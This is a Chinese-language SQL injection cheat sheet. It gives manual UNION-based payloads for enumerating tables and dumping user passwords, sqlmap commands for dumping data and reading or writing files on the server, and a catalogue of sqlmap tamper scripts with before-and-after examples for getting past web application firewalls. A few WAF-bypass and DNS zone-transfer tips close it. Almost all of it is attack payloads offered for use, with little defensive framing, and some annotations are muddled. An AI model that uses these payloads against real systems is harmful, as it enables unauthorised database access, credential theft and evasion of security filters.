## 注入   
工具:Pangolin  
Havij
### 手工注入 

> and exists(select * from admin) 
>  // 说明存在表明


----------


> admin and exists(select admin from admin) 
> // 说明存在admin列
> 


----------


> and exists(select password from admin)  
> // 说明存在passwordand
> 


----------


>  (select top 1 len(admin) from admin)>1 
>  // 猜测第一条记录的第一位ascii码为a


----------
> 插件:HackBar


----------


> --’

注释后面的语句


----------


> group_concat()

函数让检索出来的语句以行的形式显示。如果不用这个函数，就不会看到输出结果。 

  


----------


> 'union select 1,table_name from INFORMATION_SCHEMA.tables -- ’
通过查询系统表，可以看到MYSQL数据库中每一个表的名字以及每一列的名字等，


----------


>    'union select 1,column_name from INFORMATION_SCHEMA.columns where table_name='users' --'
> 
> 列出users表：


----------

>  ' union select null, password from users --'
> 
> 
>  password列：

  


----------

> ' union select password, concat(first_name,' ',last_name, ' ',user)
> from users --' 
> 用concat()函数将所有信息都列出来：


----------


> version(),database(),user() //版本，数据库名称，用户名

php+mysql手工注入
暴字段长度:`ORDER BY num/*`
匹配字段:`and 1=1 union select 1,2,3,4...n/*`

### sqlmap  

-dbs -v 0    -dbs, 根据不同的数据库管理平台探测包含的数据库名称    
-D dvwa --tables 根据数据库dvwa查找表名     -D dvwa --tables -T users --columns 查找dvwa数据库中的users表中的字段列表    
-D dvwa --tables -T users --columns --dump  字段内容  

> -u http://xxx.asp --data"id=114" --level 3
>  post注入


- `--tables` 爆表
- `-T 表名 --columns` 爆字段
- `-T 表名 -C 字段名 -C" "` --dump
- `--file-read 文件` 读取文件
- `--file-write 本地文件 --file-dest 目标目录`写入文件

### sqlmap 自带的绕过脚本 --tamper详解  

    (1) apostrophemask.py UTF-8编码 
    Example: 
    Input: AND '1'='1' 
    Output: AND %EF%BC%871%EF%BC%87=%EF%BC%871%EF%BC%87 

    (2) apostrophenullencode.py unicode编码 
    Example: 
    Input: AND '1'='1' 
    Output: AND %00%271%00%27=%00%271%00%27 

    (3) appendnullbyte.py 添加%00   
    Example:  
    Input: AND 1=1  
    Output: AND 1=1%00  
    Requirement:  
    Microsoft Access  

    (4) base64encode.py base64编码 
    Example: 
    Input: 1' AND SLEEP(5)# 
    Output: MScgQU5EIFNMRUVQKDUpIw` 

    (5) between.py 以”not between”替换”>“ 
    Example: 
    Input: 'A > B' 
    Output: 'A NOT BETWEEN 0 AND B' 

    (6) bluecoat.py 以随机的空白字符替代空格，以”like”替代”=“ 
    Example: 
    Input: SELECT id FROM users where id = 1 
    Output: SELECT%09id FROM users where id LIKE 1 
    Requirement: 
    MySQL 5.1, SGOS 

    (7) chardoubleencode.py 双重url编码 
    Example: 
    Input: SELECT FIELD FROM%20TABLE 
    Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545

    (8) charencode.py url编码 
    Example: 
    Input: SELECT FIELD FROM%20TABLE 
    Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45

    (9) charunicodeencode.py 对未进行url编码的字符进行unicode编码 
    Example: 
    Input: SELECT FIELD%20FROM TABLE 
    Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045'
    Requirement: 
    ASP 
    ASP.NET 

    (10) equaltolike.py 以”like”替代”=“ 
    Example: 
    Input: SELECT FROM users WHERE id=1 
    Output: SELECT FROM users WHERE id LIKE 1 

    (11) halfversionedmorekeywords.py在每个关键字前添加条件注释 
    Example: 
    Input: value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa 
    Output: value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND 'QDWa'='QDWa 
    Requirement: 
    MySQL < 5.1 

    (12) ifnull2ifisnull.py 以”IF(ISNULL(A), B, A)”替换”IFNULL(A, B)” 
    Example: 
    Input: IFNULL(1, 2) 
    Output: IF(ISNULL(1), 2, 1) 
    Requirement: 
    MySQL 
    SQLite (possibly) 
    SAP MaxDB (possibly) 

    (13) modsecurityversioned.py 条件注释 
    Example: 
    Input: 1 AND 2>1-- 
    Output: 1 /*!30000AND 2>1*/-- 
    Requirement: 
    MySQL 

    (14) modsecurityzeroversioned.py 条件注释，0000 
    Example: 
    Input: 1 AND 2>1-- 
    Output: 1 /*!00000AND 2>1*/-- 
    Requirement: 
    MySQL 

    (15) multiplespaces.py 添加多个空格 
    Example: 
    Input: UNION SELECT 
    Output:  UNION   SELECT 

    (16) nonrecursivereplacement.py 可以绕过对关键字删除的防注入（这个我也不知道怎么说好，看例子。。。） 
    Example: 
    Input: 1 UNION SELECT 2-- 
    Output: 1 UNUNIONION SELSELECTECT 2-- 

    (17) percentage.py 在每个字符前添加百分号（%） 
    Example: 
    Input: SELECT FIELD FROM TABLE 
    Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E 
    Requirement: 
    ASP 

    (18) randomcase.py 随即大小写 
    Example: 
    Input: INSERT 
    Output: InsERt 

    (19) randomcomments.py 随机插入区块注释 
    Example: 
    'INSERT' becomes 'IN/**/S/**/ERT' 
    securesphere.py 语句结尾添加”真”字符串 
    Example: 
    Input: AND 1=1 
    Output: AND 1=1 and '0having'='0having' 

    (20) sp_password.py 语句结尾添加”sp_password”迷惑数据库日志（很。。。） 
    Example: www.2cto.com 
    Input: 1 AND 9227=9227-- 
    Output: 1 AND 9227=9227--sp_password 
    Requirement: 
    MSSQL 

    (21) space2comment.py 以区块注释替换空格 
    Example: 
    Input: SELECT id FROM users 
    Output: SELECT/**/id/**/FROM/**/users 

    (22) space2dash.py 以单行注释”--”和随机的新行替换空格 
    Example: 
    Input: 1 AND 9227=9227 
    Output: 1--PTTmJopxdWJ%0AAND--cWfcVRPV%0A9227=9227 
    Requirement: 
    MSSQL 
    SQLite 

    (23) space2hash.py 以单行注释”#”和由随机字符组成的新行替换空格 
    Example: 
    Input: 1 AND 9227=9227 
    Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227 
    Requirement: 
    MySQL 

    (24) space2morehash.py 没看出来和上面那个有什么区别。。 
    Requirement: 
    MySQL >= 5.1.13 

    (25) space2mssqlblank.py 以随机空白字符替换空格 
    Example: 
    Input: SELECT id FROM users 
    Output: SELECT%08id%02FROM%0Fusers 
    Requirement: 
    Microsoft SQL Server 

    (26) space2mssqlhash.py 以单行注释”#”和新行替换空格 
    Example: 
    Input: 1 AND 9227=9227 
    Output: 1%23%0A9227=9227 
    Requirement: 
    MSSQL 
    MySQL 

    (27) space2mysqlblank.py 以随机空白字符替换空格 
    Example: 
    Input: SELECT id FROM users 
    Output: SELECT%0Bid%0BFROM%A0users 
    Requirement: 
    MySQL 

    (28) space2mysqldash.py 以单行注释和新行替换空格 
    Example: 
    Input: 1 AND 9227=9227 
    Output: 1--%0AAND--%0A9227=9227 
    Requirement: 
    MySQL 
    MSSQL 

    (29) space2plus.py 以”+”替换空格 
    Example: 
    Input: SELECT id FROM users 
    Output: SELECT+id+FROM+users 

    (30) space2randomblank.py 随机空白字符替换空格 
    Example: 
    Input: SELECT id FROM users 
    Output: SELECT\rid\tFROM\nusers 

    (31) unionalltounion.py 以”union all”替换”union” 
    Example: 
    Input: -1 UNION ALL SELECT 
    Output: -1 UNION SELECT 

    (32) unmagicquotes.py 以”%bf%27”替换单引号，并在结尾添加注释”--” 
    Example: 
    Input: 1' AND 1=1 
    Output: 1%bf%27 AND 1=1--%20 

    (33)versionedkeywords.py 对不是函数的关键字条件注释 
    Example: 
    Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))# 
    Output:  1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#
    Requirement: 
    MySQL 


    (34) versionedmorekeywords.py 对关键字条件注释 
    Example: 
    Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# 
    Output: 1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#
    Requirement: 
    MySQL >= 5.1.13


## 绕过
1. sql注入绕行waf:/**/ = 空格；POST ，cookie中转
2. /database目录
3. brup 单线程可以扫的
4. 域传送:dnsenum -enum xxx.com 检测域传送
5. http://www.dmzlab.com/77396.html  
